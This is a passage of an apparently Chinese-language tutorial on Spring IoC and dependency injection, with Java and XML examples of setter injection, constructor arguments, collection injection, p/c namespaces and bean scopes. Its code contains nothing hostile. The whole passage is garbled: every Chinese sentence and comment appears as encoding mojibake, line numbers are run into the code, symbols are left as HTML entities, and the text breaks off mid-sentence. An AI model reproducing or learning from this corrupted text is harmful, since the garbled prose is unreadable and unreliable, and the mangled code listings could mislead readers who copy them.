12345678public class MyTest &#123; public static void main(String[] args) &#123; //ç”¨æˆ·å®é™…è°ƒç”¨çš„æ˜¯ä¸šåŠ¡å±‚ï¼Œdaoå±‚ä»–ä»¬ä¸éœ€è¦æ¥è§¦ï¼ UserService userService = new UserServiceImpl(); userService.getUser(); &#125;&#125; åœ¨æˆ‘ä»¬ä¹‹å‰çš„ä¸šåŠ¡ä¸­ï¼Œç”¨æˆ·çš„éœ€æ±‚å¯èƒ½ä¼šå½±å“æˆ‘ä»¬åŸæ¥çš„ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®ç”¨æˆ·çš„éœ€æ±‚å»ä¿®æ”¹åŸä»£ç ï¼å¦‚æœç¨‹åºä»£ç é‡ååˆ†å¤§ï¼Œä¿®æ”¹ä¸€æ¬¡çš„æˆæœ¬ä»£ä»·ååˆ†æ˜‚è´µï¼ æ¯”å¦‚ç”¨æˆ·æäº†ä¸€ä¸ªéœ€æ±‚ï¼Œæƒ³åˆ†åˆ«ç”¨ MySqlï¼ŒSqlServerï¼ŒOracle æ•°æ®åº“è·å–ç”¨æˆ·æ•°æ®ï¼Œé‚£æˆ‘ä»¬å‘¢å°±éœ€è¦æŠŠUserdaoçš„å®ç°ç±»å¢åŠ ä¸€ä¸ª 123456public class UserDaoMySqlImpl implements UserDao &#123; @Override public void getUser() &#123; System.out.println(&quot;MySqlè·å–ç”¨æˆ·æ•°æ®&quot;); &#125;&#125; è¿˜è¦å»serviceå®ç°ç±»é‡Œé¢ä¿®æ”¹å¯¹åº”çš„å®ç° 1234567public class UserServiceImpl implements UserService &#123; private UserDao userDao = new UserDaoMySqlImpl(); @Override public void getUser() &#123; userDao.getUser(); &#125;&#125; å½“ä¸šåŠ¡å˜å¾—å¤æ‚èµ·æ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿™æ ·æ—¢è¦æ”¹æ•°æ®å¤„ç†åˆè¦æ”¹ä¸šåŠ¡å¤„ç†æ˜¯å¾ˆéº»çƒ¦çš„ä¸€ä»¶äº‹ï¼Œé‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Ÿ æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªSetæ¥å£å®ç°ï¼Œå·²ç»å‘ç”Ÿäº†é©å‘½æ€§çš„å˜åŒ–ï¼ 1234567891011public class UserServiceImpl implements UserService &#123; private UserDao userDao; // åˆ©ç”¨setå®ç° public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; @Override public void getUser() &#123; userDao.getUser(); &#125;&#125; 123456789@Testpublic void test()&#123; UserServiceImpl service = new UserServiceImpl(); service.setUserDao( new UserDaoMySqlImpl() ); service.getUser(); //é‚£æˆ‘ä»¬ç°åœ¨åˆæƒ³ç”¨Oracleå»å®ç°å‘¢ service.setUserDao( new UserDaoOracleImpl() ); service.getUser();&#125; ä¹‹å‰ï¼Œç¨‹åºæ˜¯ä¸»åŠ¨åˆ›å»ºå¯¹è±¡ï¼æ§åˆ¶æƒåœ¨ç¨‹åºçŒ¿æ‰‹ä¸Šï¼ä½¿ç”¨äº†setæ³¨å…¥åï¼Œç¨‹åºä¸å†å…·æœ‰ä¸»åŠ¨æ€§ï¼Œè€Œæ˜¯å˜æˆäº†è¢«åŠ¨çš„æ¥æ”¶å¯¹è±¡ï¼ è¿™ç§æ€æƒ³ï¼Œä»æœ¬è´¨ä¸Šè§£å†³äº†é—®é¢˜ï¼Œæˆ‘ä»¬ç¨‹åºçŒ¿ä¸ç”¨å†å»ç®¡ç†å¯¹è±¡çš„åˆ›å»ºäº†ã€‚ç³»ç»Ÿçš„è€¦åˆæ€§å¤§å¤§é™ä½~ï¼Œå¯ä»¥æ›´åŠ ä¸“æ³¨çš„åœ¨ä¸šåŠ¡çš„å®ç°ä¸Šï¼è¿™æ˜¯IOCçš„åŸå‹ï¼ ä»æœåŠ¡ç«¯ä¸»å¯¼æ§åˆ¶æƒåè½¬åˆ°äº†å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯ä¸»å¯¼æƒï¼Œè¿™å°±æ˜¯æ§åˆ¶åè½¬IOCçš„æ„æ€ hello springä¸Šé¢è®²çš„ IOc æ˜¯æˆ‘ä»¬è‡ªå·±å®ç°çš„ï¼Œç°åœ¨æ¥çœ‹çœ‹ spring æ˜¯æ€ä¹ˆå¤„ç†çš„ã€‚ æ–°å»ºä¸€ä¸ªmavené¡¹ç›®ï¼Œç¼–å†™å®ä½“ç±» 123456789101112131415161718public class Hello &#123; private String str; public String getStr() &#123; return str; &#125; public void setStr(String str) &#123; this.str = str; &#125; @Override public String toString() &#123; return &quot;Hello&#123;&quot; + &quot;str=&#x27;&quot; + str + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; ç¼–å†™xmlé…ç½®æ–‡ä»¶ 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;!--ä½¿ç”¨Springæ¥åˆ›å»ºå¯¹è±¡ï¼Œåœ¨Springè¿™äº›éƒ½ç§°ä¸ºBean ç±»å‹ å˜é‡å = new ç±»å‹(); Hello hello = new Hello(); id = å˜é‡å class = newçš„å¯¹è±¡ property ç›¸å½“äºç»™å¯¹è±¡ä¸­çš„å±æ€§è®¾ç½®ä¸€ä¸ªå€¼ï¼ --&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.she11F.Hello&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;Spring&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; æµ‹è¯• 12345678910public class MyTest &#123; public static void main(String[] args) &#123; //è·å–Springçš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); //æˆ‘ä»¬çš„å¯¹è±¡ç°åœ¨éƒ½åœ¨Springä¸­çš„ç®¡ç†äº†ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ï¼Œç›´æ¥å»é‡Œé¢å–å‡ºæ¥å°±å¯ä»¥ï¼ Hello hello = (Hello) context.getBean(&quot;hello&quot;); System.out.println(hello.toString()); &#125;&#125; å¯ä»¥å‘ç°æˆ‘ä»¬æ²¡æœ‰ç”¨ new å…³é”®å­—æ¥åˆ›å»º Hello å¯¹è±¡ï¼Œè€Œæ˜¯ç”±Springåˆ›å»ºçš„ï¼ŒHelloå¯¹è±¡çš„å±æ€§æ˜¯ç”±Springå®¹å™¨è®¾ç½®çš„ã€‚ è¿™ä¸ªè¿‡ç¨‹å°±å«æ§åˆ¶åè½¬ï¼š æ§åˆ¶ï¼šè°æ¥æ§åˆ¶å¯¹è±¡çš„åˆ›å»ºï¼Œä¼ ç»Ÿåº”ç”¨ç¨‹åºçš„å¯¹è±¡æ˜¯ç”±ç¨‹åºæœ¬èº«æ§åˆ¶åˆ›å»ºçš„ï¼Œä½¿ç”¨Springåï¼Œå¯¹è±¡æ˜¯ç”±Springæ¥åˆ›å»ºçš„ã€‚ åè½¬ï¼šç¨‹åºæœ¬èº«ä¸åˆ›å»ºå¯¹è±¡ï¼Œè€Œå˜æˆè¢«åŠ¨çš„æ¥æ”¶å¯¹è±¡ã€‚ ä¾èµ–æ³¨å…¥ï¼šå°±æ˜¯åˆ©ç”¨setæ–¹æ³•æ¥è¿›è¡Œæ³¨å…¥çš„ã€‚ IOCæ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œç”±ä¸»åŠ¨çš„ç¼–ç¨‹å˜æˆè¢«åŠ¨çš„æ¥æ”¶ã€‚ æˆ‘ä»¬ç”¨è¿™ç§æ–¹å¼æ¥å®ç°æ•°æ®åº“é‚£ä¸ªæ¡ˆä¾‹ 12345678&lt;bean id=&quot;MysqlImpl&quot; class=&quot;com.she11F.dao.UserDaoMySqlImpl&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;ServiceImpl&quot; class=&quot;com.she11F.service.UserServiceImpl&quot;&gt; &lt;!--æ³¨æ„: è¿™é‡Œçš„nameå¹¶ä¸æ˜¯å±æ€§ , è€Œæ˜¯setæ–¹æ³•åé¢çš„é‚£éƒ¨åˆ† , é¦–å­—æ¯å°å†™--&gt; &lt;!--å¼•ç”¨å¦å¤–ä¸€ä¸ªbean , ä¸æ˜¯ç”¨value è€Œæ˜¯ç”¨ ref--&gt; &lt;property name=&quot;userDao&quot; ref=&quot;MysqlImpl&quot;&gt;&lt;/property&gt;&lt;/bean&gt; 1234567public class MyTest &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); UserServiceImpl serviceImpl = (UserServiceImpl) context.getBean(&quot;ServiceImpl&quot;); serviceImpl.getUser(); &#125;&#125; åˆ°äº†ç°åœ¨ï¼Œæˆ‘ä»¬å½»åº•ä¸ç”¨åœ¨ç¨‹åºä¸­å»æ”¹åŠ¨äº†ï¼Œè¦å®ç°ä¸åŒçš„æ“ä½œï¼Œåªéœ€è¦åœ¨xmlé…ç½®æ–‡ä»¶ä¸­è¿›è¡Œä¿®æ”¹ï¼Œæ‰€è°“çš„IOCï¼Œä¸€å¥è¯æå®šï¼šå¯¹è±¡ç”±Springæ¥åˆ›å»ºï¼Œç®¡ç†ï¼Œè£…é…ï¼ IOCåˆ›å»ºå¯¹è±¡æ–¹å¼é€šè¿‡ä¸Šé¢é…ç½® xml ç„¶å spring å®¹å™¨ç›´æ¥è·å–å¯¹è±¡æˆ‘ä»¬æ„Ÿå—åˆ°äº† spring çš„ä¼˜è¶Šæ€§ï¼Œä½†æ˜¯æˆ‘ä¸ç¦è¦é—®ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆèƒ½ç›´æ¥è·å–å¯¹è±¡ï¼Œå¸¸è¨€é“ â€œå½“ä½ æ„Ÿå—å²æœˆé™å¥½ä¹‹æ—¶ï¼Œä¸€å®šæœ‰äººåœ¨æ›¿ä½ è´Ÿé‡å‰è¡Œâ€ï¼Œæ²¡é”™ï¼Œå…¶å®æ˜¯ spring åœ¨å·å·å®ä¾‹åŒ– é€šè¿‡æ— å‚æ„é€ æ–¹æ³•æ¥åˆ›å»ºUser.java 123456789101112public class User &#123; private String name; public User() &#123; System.out.println(&quot;useræ— å‚æ„é€ æ–¹æ³•&quot;); &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name=&quot;+ name ); &#125;&#125; beans.xml 123&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;she11F&quot;&gt;&lt;/property&gt;&lt;/bean&gt; æµ‹è¯•ç±» 12345678@Testpublic void test()&#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); //åœ¨æ‰§è¡ŒgetBeançš„æ—¶å€™, userå·²ç»åˆ›å»ºå¥½äº† , é€šè¿‡æ— å‚æ„é€  User user = (User) context.getBean(&quot;user&quot;); //è°ƒç”¨å¯¹è±¡çš„æ–¹æ³• . user.show();&#125; ç»“æœå¯ä»¥å‘ç°ï¼Œåœ¨è°ƒç”¨showæ–¹æ³•ä¹‹å‰ï¼ŒUserå¯¹è±¡å·²ç»é€šè¿‡æ— å‚æ„é€ åˆå§‹åŒ–äº†ï¼ é€šè¿‡æœ‰å‚æ„é€ æ–¹æ³•æ¥åˆ›å»ºUserT.java 123456789101112public class UserT &#123; private String name; public UserT(String name) &#123; this.name = name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name=&quot;+ name ); &#125;&#125; beans.xml æœ‰ä¸‰ç§æ–¹å¼ç¼–å†™ 12345&lt;!-- ç¬¬ä¸€ç§æ ¹æ®indexå‚æ•°ä¸‹æ ‡è®¾ç½® --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt; &lt;!-- indexæŒ‡æ„é€ æ–¹æ³• , ä¸‹æ ‡ä»0å¼€å§‹ --&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;she11F&quot;/&gt;&lt;/bean&gt; 12345&lt;!-- ç¬¬äºŒç§æ ¹æ®å‚æ•°åå­—è®¾ç½®ï¼Œæœ€æ¨è --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt; &lt;!-- nameæŒ‡å‚æ•°å --&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;she11F&quot;/&gt;&lt;/bean&gt; 1234&lt;!-- ç¬¬ä¸‰ç§æ ¹æ®å‚æ•°ç±»å‹è®¾ç½®,ä¸æ¨è --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt; &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;she11F&quot;/&gt;&lt;/bean&gt; ç»“è®ºï¼šåœ¨é…ç½®æ–‡ä»¶åŠ è½½çš„æ—¶å€™ã€‚å…¶ä¸­ç®¡ç†çš„å¯¹è±¡éƒ½å·²ç»åˆå§‹åŒ–äº†ï¼ Springé…ç½®åˆ«åalias è®¾ç½®åˆ«å , ä¸ºbeanè®¾ç½®åˆ«å , å¯ä»¥è®¾ç½®å¤šä¸ªåˆ«å 12&lt;!--è®¾ç½®åˆ«åï¼šåœ¨è·å–Beançš„æ—¶å€™å¯ä»¥ä½¿ç”¨åˆ«åè·å–--&gt;&lt;alias name=&quot;userT&quot; alias=&quot;userNew&quot;/&gt; Beançš„é…ç½®1234567891011&lt;!--beanå°±æ˜¯javaå¯¹è±¡,ç”±Springåˆ›å»ºå’Œç®¡ç†--&gt;&lt;!-- id æ˜¯beançš„æ ‡è¯†ç¬¦,è¦å”¯ä¸€,å¦‚æœæ²¡æœ‰é…ç½®id,nameå°±æ˜¯é»˜è®¤æ ‡è¯†ç¬¦ å¦‚æœé…ç½®id,åˆé…ç½®äº†name,é‚£ä¹ˆnameæ˜¯åˆ«å nameå¯ä»¥è®¾ç½®å¤šä¸ªåˆ«å,å¯ä»¥ç”¨é€—å·,åˆ†å·,ç©ºæ ¼éš”å¼€ å¦‚æœä¸é…ç½®idå’Œname,å¯ä»¥æ ¹æ®applicationContext.getBean(.class)è·å–å¯¹è±¡; classæ˜¯beançš„å…¨é™å®šå=åŒ…å+ç±»å--&gt;&lt;bean id=&quot;hello&quot; name=&quot;hello2 h2,h3;h4&quot; class=&quot;com.kuang.pojo.Hello&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;Spring&quot;/&gt;&lt;/bean&gt; importå›¢é˜Ÿçš„åˆä½œé€šè¿‡importæ¥å®ç° . 1&lt;import resource=&quot;&#123;path&#125;/beans.xml&quot;/&gt; ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰ ä¾èµ–æ³¨å…¥ï¼ˆDependency Injection,DIï¼‰ã€‚ ä¾èµ– : æŒ‡ Bean å¯¹è±¡çš„åˆ›å»ºä¾èµ–äºå®¹å™¨ . Beanå¯¹è±¡çš„ä¾èµ–èµ„æº . æ³¨å…¥ : æŒ‡ Bean å¯¹è±¡æ‰€ä¾èµ–çš„èµ„æº , ç”±å®¹å™¨æ¥è®¾ç½®å’Œè£…é… . æ„é€ å™¨æ³¨å…¥å‰é¢çš„æ¡ˆä¾‹æœ‰ setæ³¨å…¥ (é‡ç‚¹)è¦æ±‚è¢«æ³¨å…¥çš„å±æ€§ , å¿…é¡»æœ‰setæ–¹æ³• , setæ–¹æ³•çš„æ–¹æ³•åç”±set + å±æ€§é¦–å­—æ¯å¤§å†™ , å¦‚æœå±æ€§æ˜¯booleanç±»å‹ , æ²¡æœ‰setæ–¹æ³• , æ˜¯ is . æµ‹è¯•pojoç±» : Address.java 1234567891011package com.she11F.pojo;public class Address &#123; private String address; public String getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125;&#125; Student 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.she11F.pojo;import java.util.List;import java.util.Map;import java.util.Properties;import java.util.Set;public class Student &#123; private String name; private Address address; private String[] books; private List&lt;String&gt; hobbys; private Map&lt;String,String&gt; card; private Set&lt;String&gt; games; private String wife; private Properties info; public void setName(String name) &#123; this.name = name; &#125; public void setAddress(Address address) &#123; this.address = address; &#125; public void setBooks(String[] books) &#123; this.books = books; &#125; public void setHobbys(List&lt;String&gt; hobbys) &#123; this.hobbys = hobbys; &#125; public void setCard(Map&lt;String, String&gt; card) &#123; this.card = card; &#125; public void setGames(Set&lt;String&gt; games) &#123; this.games = games; &#125; public void setWife(String wife) &#123; this.wife = wife; &#125; public void setInfo(Properties info) &#123; this.info = info; &#125; public String getName() &#123; return name; &#125; public void show()&#123; System.out.println(&quot;name=&quot;+ name + &quot;,address=&quot;+ address.getAddress() + &quot;,books=&quot; ); for (String book:books)&#123; System.out.print(&quot;&lt;&lt;&quot;+book+&quot;&gt;&gt;\\t&quot;); &#125; System.out.println(&quot; çˆ±å¥½:&quot;+hobbys); System.out.println(&quot;card:&quot;+card); System.out.println(&quot;games:&quot;+games); System.out.println(&quot;wife:&quot;+wife); System.out.println(&quot;info:&quot;+info); &#125;&#125; å¸¸é‡æ³¨å…¥ 123&lt;bean id=&quot;student&quot; class=&quot;com.kuang.pojo.Student&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;å°æ˜&quot;/&gt;&lt;/bean&gt; Beanæ³¨å…¥ &#x3D;&#x3D;æ³¨æ„ç‚¹ï¼šè¿™é‡Œçš„å€¼æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œref&#x3D;&#x3D; 1&lt;property name=&quot;address&quot; ref=&quot;addr&quot;/&gt; æ•°ç»„æ³¨å…¥ 1234567891011&lt;bean id=&quot;student&quot; class=&quot;com.she11F.pojo.Student&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;å°æ˜&quot;/&gt; &lt;property name=&quot;address&quot; ref=&quot;addr&quot;/&gt; &lt;property name=&quot;books&quot;&gt; &lt;array&gt; &lt;value&gt;è¥¿æ¸¸è®°&lt;/value&gt; &lt;value&gt;çº¢æ¥¼æ¢¦&lt;/value&gt; &lt;value&gt;æ°´æµ’ä¼ &lt;/value&gt; &lt;/array&gt; &lt;/property&gt;&lt;/bean&gt; Listæ³¨å…¥ 1234567&lt;property name=&quot;hobbys&quot;&gt; &lt;list&gt; &lt;value&gt;å¬æ­Œ&lt;/value&gt; &lt;value&gt;çœ‹ç”µå½±&lt;/value&gt; &lt;value&gt;çˆ¬å±±&lt;/value&gt; &lt;/list&gt;&lt;/property&gt; Mapæ³¨å…¥ 123456&lt;property name=&quot;card&quot;&gt; &lt;map&gt; &lt;entry key=&quot;ä¸­å›½é‚®æ”¿&quot; value=&quot;456456456465456&quot;/&gt; &lt;entry key=&quot;å»ºè®¾&quot; value=&quot;1456682255511&quot;/&gt; &lt;/map&gt;&lt;/property&gt; setæ³¨å…¥ 1234567&lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;LOL&lt;/value&gt; &lt;value&gt;BOB&lt;/value&gt; &lt;value&gt;COC&lt;/value&gt; &lt;/set&gt;&lt;/property&gt; Nullæ³¨å…¥ 1&lt;property name=&quot;wife&quot;&gt;&lt;null/&gt;&lt;/property&gt; Propertiesæ³¨å…¥ 1234567&lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;å­¦å·&quot;&gt;20190604&lt;/prop&gt; &lt;prop key=&quot;æ€§åˆ«&quot;&gt;ç”·&lt;/prop&gt; &lt;prop key=&quot;å§“å&quot;&gt;å°æ˜&lt;/prop&gt; &lt;/props&gt;&lt;/property&gt; è·‘å‡ºç»“æœå¦‚å›¾æ‰€ç¤º æ‹“å±•æ³¨å…¥å®ç°User.java ï¼š ã€æ³¨æ„ï¼šè¿™é‡Œæ²¡æœ‰æœ‰å‚æ„é€ å™¨ï¼ã€‘ 1234567891011121314151617public class User &#123; private String name; private int age; public void setName(String name) &#123; this.name = name; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &#x27;&#125;&#x27;; &#125;&#125; 1ã€På‘½åç©ºé—´æ³¨å…¥ : éœ€è¦åœ¨å¤´æ–‡ä»¶ä¸­åŠ å…¥çº¦æŸæ–‡ä»¶ 123å¯¼å…¥çº¦æŸ : xmlns:p=&quot;http://www.springframework.org/schema/p&quot;&lt;!--P(å±æ€§: properties)å‘½åç©ºé—´ , å±æ€§ä¾ç„¶è¦è®¾ç½®setæ–¹æ³•--&gt;&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; p:name=&quot;she11f&quot; /&gt; 2ã€c å‘½åç©ºé—´æ³¨å…¥ : éœ€è¦åœ¨å¤´æ–‡ä»¶ä¸­åŠ å…¥çº¦æŸæ–‡ä»¶ 123å¯¼å…¥çº¦æŸ : xmlns:c=&quot;http://www.springframework.org/schema/c&quot;&lt;!--C(æ„é€ : Constructor)å‘½åç©ºé—´ , å±æ€§ä¾ç„¶è¦è®¾ç½®setæ–¹æ³•--&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot; c:name=&quot;she11f&quot; c:age=&quot;18&quot;/&gt; å‘ç°é—®é¢˜ï¼šçˆ†çº¢äº†ï¼Œåˆšæ‰æˆ‘ä»¬æ²¡æœ‰å†™æœ‰å‚æ„é€ ï¼ è§£å†³ï¼šæŠŠæœ‰å‚æ„é€ å™¨åŠ ä¸Šï¼Œè¿™é‡Œä¹Ÿèƒ½çŸ¥é“ï¼Œc å°±æ˜¯æ‰€è°“çš„æ„é€ å™¨æ³¨å…¥ï¼ Beançš„ä½œç”¨åŸŸ åœ¨Springä¸­ï¼Œé‚£äº›ç»„æˆåº”ç”¨ç¨‹åºçš„ä¸»ä½“åŠç”±Spring IoCå®¹å™¨æ‰€ç®¡ç†çš„å¯¹è±¡ï¼Œè¢«ç§°ä¹‹ä¸ºbeanã€‚ç®€å•åœ°è®²ï¼Œbeanå°±æ˜¯ç”±IoCå®¹å™¨åˆå§‹åŒ–ã€è£…é…åŠç®¡ç†çš„å¯¹è±¡ . å‡ ç§ä½œç”¨åŸŸä¸­ï¼Œrequestã€sessionä½œç”¨åŸŸä»…åœ¨åŸºäºwebçš„åº”ç”¨ä¸­ä½¿ç”¨ï¼ˆä¸å¿…å…³å¿ƒä½ æ‰€é‡‡ç”¨çš„æ˜¯ä»€ä¹ˆwebåº”ç”¨æ¡†æ¶ï¼‰ï¼Œåªèƒ½ç”¨åœ¨åŸºäºwebçš„Spring ApplicationContextç¯å¢ƒã€‚ Singleton å½“ä¸€ä¸ªbeançš„ä½œç”¨åŸŸä¸ºSingletonï¼Œé‚£ä¹ˆSpring IoCå®¹å™¨ä¸­åªä¼šå­˜åœ¨ä¸€ä¸ªå…±äº«çš„beanå®ä¾‹ï¼Œå¹¶ä¸”æ‰€æœ‰å¯¹beançš„è¯·æ±‚ï¼Œåªè¦idä¸è¯¥beanå®šä¹‰ç›¸åŒ¹é…ï¼Œåˆ™åªä¼šè¿”å›beançš„åŒä¸€å®ä¾‹ã€‚Singletonæ˜¯å•ä¾‹ç±»å‹ï¼Œå°±æ˜¯åœ¨åˆ›å»ºèµ·å®¹å™¨æ—¶å°±åŒæ—¶è‡ªåŠ¨åˆ›å»ºäº†ä¸€ä¸ªbeançš„å¯¹è±¡ï¼Œä¸ç®¡ä½ æ˜¯å¦ä½¿ç”¨ï¼Œä»–éƒ½å­˜åœ¨äº†ï¼Œæ¯æ¬¡è·å–åˆ°çš„å¯¹è±¡éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚æ³¨æ„ï¼ŒSingletonä½œç”¨åŸŸæ˜¯Springä¸­çš„ç¼ºçœä½œç”¨åŸŸã€‚è¦åœ¨XMLä¸­å°†beanå®šä¹‰æˆsingletonï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š 1&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; c:name=&quot;she11f&quot; c:age=&quot;20&quot; scope=&quot;singleton&quot;/&gt; æµ‹è¯•ï¼š 123User user1 = (User) context.getBean(&quot;user&quot;);User user2 = (User) context.getBean(&quot;user&quot;);System.out.println(user1 == user2); è¿”å› true Prototype å½“ä¸€ä¸ªbeançš„ä½œç”¨åŸŸä¸ºPrototypeï¼Œè¡¨ç¤ºä¸€ä¸ªbeanå®šä¹‰å¯¹åº”å¤šä¸ªå¯¹è±¡å®ä¾‹ã€‚Prototypeä½œç”¨åŸŸçš„beanä¼šå¯¼è‡´åœ¨æ¯æ¬¡å¯¹è¯¥beanè¯·æ±‚ï¼ˆå°†å…¶æ³¨å…¥åˆ°å¦ä¸€ä¸ªbeanä¸­ï¼Œæˆ–è€…ä»¥ç¨‹åºçš„æ–¹å¼è°ƒç”¨å®¹å™¨çš„getBean()æ–¹æ³•ï¼‰æ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„beanå®ä¾‹ã€‚Prototypeæ˜¯åŸå‹ç±»å‹ï¼Œå®ƒåœ¨æˆ‘ä»¬åˆ›å»ºå®¹å™¨çš„æ—¶å€™å¹¶æ²¡æœ‰å®ä¾‹åŒ–ï¼Œè€Œæ˜¯å½“æˆ‘ä»¬è·å–beançš„æ—¶å€™æ‰ä¼šå»åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸”æˆ‘ä»¬æ¯æ¬¡è·å–åˆ°çš„å¯¹è±¡éƒ½ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚æ ¹æ®ç»éªŒï¼Œå¯¹æœ‰çŠ¶æ€çš„beanåº”è¯¥ä½¿ç”¨prototypeä½œç”¨åŸŸï¼Œè€Œå¯¹æ— çŠ¶æ€çš„beanåˆ™åº”è¯¥ä½¿ç”¨singletonä½œç”¨åŸŸã€‚åœ¨XMLä¸­å°†beanå®šä¹‰æˆprototypeï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š 123scope=&quot;prototype&quot;æˆ–è€…singleton=&quot;false&quot; Request å½“ä¸€ä¸ªbeançš„ä½œç”¨åŸŸä¸ºRequestï¼Œè¡¨ç¤ºåœ¨ä¸€æ¬¡HTTPè¯·æ±‚ä¸­ï¼Œä¸€ä¸ªbeanå®šä¹‰å¯¹åº”ä¸€ä¸ªå®ä¾‹ï¼›å³æ¯ä¸ªHTTPè¯·æ±‚éƒ½ä¼šæœ‰å„è‡ªçš„beanå®ä¾‹ï¼Œå®ƒä»¬ä¾æ®æŸä¸ªbeanå®šä¹‰åˆ›å»ºè€Œæˆã€‚è¯¥ä½œç”¨åŸŸä»…åœ¨åŸºäºwebçš„Spring ApplicationContextæƒ…å½¢ä¸‹æœ‰æ•ˆã€‚è€ƒè™‘ä¸‹é¢beanå®šä¹‰ï¼š 1scope=&quot;request&quot; é’ˆå¯¹æ¯æ¬¡HTTPè¯·æ±‚ï¼ŒSpringå®¹å™¨ä¼šæ ¹æ®loginAction beançš„å®šä¹‰åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„LoginAction beanå®ä¾‹ï¼Œä¸”è¯¥loginAction beanå®ä¾‹ä»…åœ¨å½“å‰HTTP requestå†…æœ‰æ•ˆï¼Œå› æ­¤å¯ä»¥æ ¹æ®éœ€è¦æ”¾å¿ƒçš„æ›´æ”¹æ‰€å»ºå®ä¾‹çš„å†…éƒ¨çŠ¶æ€ï¼Œè€Œå…¶ä»–è¯·æ±‚ä¸­æ ¹æ®loginAction beanå®šä¹‰åˆ›å»ºçš„å®ä¾‹ï¼Œå°†ä¸ä¼šçœ‹åˆ°è¿™äº›ç‰¹å®šäºæŸä¸ªè¯·æ±‚çš„çŠ¶æ€å˜åŒ–ã€‚å½“å¤„ç†è¯·æ±‚ç»“æŸï¼Œrequestä½œç”¨åŸŸçš„beanå®ä¾‹å°†è¢«é”€æ¯ã€‚ Session å½“ä¸€ä¸ªbeançš„ä½œç”¨åŸŸä¸ºSessionï¼Œè¡¨ç¤ºåœ¨ä¸€ä¸ªHTTP Sessionä¸­ï¼Œä¸€ä¸ªbeanå®šä¹‰å¯¹åº”ä¸€ä¸ªå®ä¾‹ã€‚è¯¥ä½œç”¨åŸŸä»…åœ¨åŸºäºwebçš„Spring ApplicationContextæƒ…å½¢ä¸‹æœ‰æ•ˆã€‚è€ƒè™‘ä¸‹é¢beanå®šä¹‰ï¼š 1scope=&quot;session&quot; é’ˆå¯¹æŸä¸ªHTTP Sessionï¼ŒSpringå®¹å™¨ä¼šæ ¹æ®userPreferences beanå®šä¹‰åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„userPreferences beanå®ä¾‹ï¼Œä¸”è¯¥userPreferences beanä»…åœ¨å½“å‰HTTP Sessionå†…æœ‰æ•ˆã€‚ä¸requestä½œç”¨åŸŸä¸€æ ·ï¼Œå¯ä»¥æ ¹æ®éœ€è¦æ”¾å¿ƒçš„æ›´æ”¹æ‰€åˆ›å»ºå®ä¾‹çš„å†…éƒ¨çŠ¶æ€ï¼Œè€Œåˆ«çš„HTTP Sessionä¸­æ ¹æ®userPreferencesåˆ›å»ºçš„å®ä¾‹ï¼Œå°†ä¸ä¼šçœ‹åˆ°è¿™äº›ç‰¹å®šäºæŸä¸ªHTTP Sessionçš„çŠ¶æ€å˜åŒ–ã€‚å½“HTTP 